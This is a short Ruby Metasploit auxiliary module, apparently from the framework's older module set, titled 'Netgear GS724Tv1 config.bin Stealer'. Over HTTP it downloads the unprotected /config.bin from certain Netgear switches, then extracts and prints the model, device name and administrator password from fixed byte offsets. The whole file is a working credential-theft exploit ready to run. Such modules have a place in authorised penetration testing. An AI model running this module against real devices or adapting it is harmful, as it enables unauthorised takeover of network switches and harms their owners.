require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
          'Name'        => 'Netgear GS724Tv1 config.bin Stealer',
          'Version'     => '0.1',
          'Description' => %q{This module will download the unprotected config.bin from certain
                            Netgear switches and extract the password},
          'Author'      => 'Mario Manno <mario.manno@googlemail.com>',
          'License'     =>  GPL_LICENSE
         )

    deregister_options('VHOST')
    register_options([
                     Opt::RPORT(80),
                     OptString.new('RPATH', [false, "File to retrieve","/config.bin"]),
    ], self.class)
  end

  def run
    uri =  datastore['RPATH'].to_s
    print_status("Attempting to retrieve #{datastore['RPATH']}...")
    res = send_request_cgi({ 'uri' => uri }, 0)

    if (res)
      print_status("The server returned: #{res.code} #{res.message}")
      model = extract_text(res.body, 0)
      name = extract_text(res.body, 20)
      password = extract_text(res.body, 74)
      print_status "Netgear #{model} named #{name} has password #{password}"
    else
      print_status("No response from the server")
    end
  end

  def extract_text(bytes, offset)
    password = ""
    ende = bytes.index("\x00", offset)
    password = bytes[offset..ende]
    password
  end

end
